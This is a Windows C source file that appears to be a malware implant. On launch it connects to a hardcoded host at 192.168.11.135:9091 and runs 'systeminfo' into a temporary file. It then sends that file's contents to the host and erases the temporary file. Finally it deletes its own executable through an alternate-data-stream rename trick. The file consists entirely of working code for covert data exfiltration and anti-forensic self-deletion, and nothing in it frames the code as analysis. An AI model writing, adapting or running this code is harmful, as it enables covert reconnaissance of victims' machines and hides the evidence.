#include <winsock2.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <windows.h>
#include <stdlib.h>
#include "timeapi.h"
#include <stdbool.h>

#include <ws2tcpip.h>

#include <windows.h>
#include <mmsystem.h>
#include <conio.h>

#include <winternl.h>




#pragma comment (lib, "Shell32")
#pragma comment (lib, "User32")
#pragma comment (lib, "Winmm")
#pragma comment (lib, "ws2_32")

#define NEW_STREAM L":NEW_STREAM"

HANDLE hEvent;


void copy(int sockfd, char* filename) {
    FILE* in = fopen(filename, "rb");
    //	if(!in) return 6;

    uint64_t len;

    fseek(in, 0, SEEK_END);
    len = ftell(in);
    rewind(in);

    send(sockfd, (void*)&len, sizeof(len), 0);

    char buf[4096];

    while (!feof(in)) {

        size_t n = fread(buf, 1, sizeof(buf), in);
        if (n > 0) send(sockfd, buf, n, 0);
    }

    fclose(in);
}


int SelfDelete(void)
{

    HANDLE                  hFile                   = INVALID_HANDLE_VALUE;
    const wchar_t*          NEWSTREAM               = (const wchar_t*)NEW_STREAM;
    size_t                  RenameSize              = sizeof(FILE_RENAME_INFO) + sizeof(NEWSTREAM);
    PFILE_RENAME_INFO       PFRI                    = NULL;
    WCHAR                   PathSize[MAX_PATH * 2]  = { 0 };
    FILE_DISPOSITION_INFO   SetDelete               = { 0 };

    PFRI = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, RenameSize);

    ZeroMemory(PathSize, sizeof(PathSize));
    ZeroMemory(&SetDelete, sizeof(FILE_DISPOSITION_INFO));


    SetDelete.DeleteFileW = TRUE;
    PFRI->FileNameLength = sizeof(NEWSTREAM);
    RtlCopyMemory(PFRI->FileName, NEWSTREAM, sizeof(NEWSTREAM));

    if (GetModuleFileName(NULL, PathSize, MAX_PATH * 2) == 0)
    {
        printf("[GetModuleFileName()] failed to get filename");
        return EXIT_FAILURE;
    }


    hFile = CreateFileW(PathSize, (DELETE | SYNCHRONIZE), FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);

    SetFileInformationByHandle(hFile, FileRenameInfo, PFRI, RenameSize);
    CloseHandle(hFile);



    hFile = CreateFileW(PathSize, (DELETE | SYNCHRONIZE), FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
    SetFileInformationByHandle(hFile, FileDispositionInfo, &SetDelete, sizeof(SetDelete));
    CloseHandle(hFile);
    HeapFree(GetProcessHeap(), 0, PFRI);
    return EXIT_SUCCESS;
}


void Connect()
{

    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0)
        return 1;

    struct sockaddr_in server;
    server.sin_addr.s_addr = inet_addr("192.168.11.135");
    server.sin_family = AF_INET;
    server.sin_port = htons(9091);

    if (connect(sockfd, (struct sockaddr*)&server, sizeof(server)) < 0)
        return 3;

    send(sockfd, "W", 1, 0);

        system("systeminfo > sysinfo.txt");
        copy(sockfd, "sysinfo.txt");
        system("del sysinfo.txt");
        SetEvent(hEvent);
}
int main()
{
    hEvent = CreateEvent(
        NULL,
        TRUE,
        FALSE,
        TEXT("DeleteEvent")
    );
    Connect();

    WaitForSingleObject(hEvent, INFINITE);
    SelfDelete();
    return 0;
}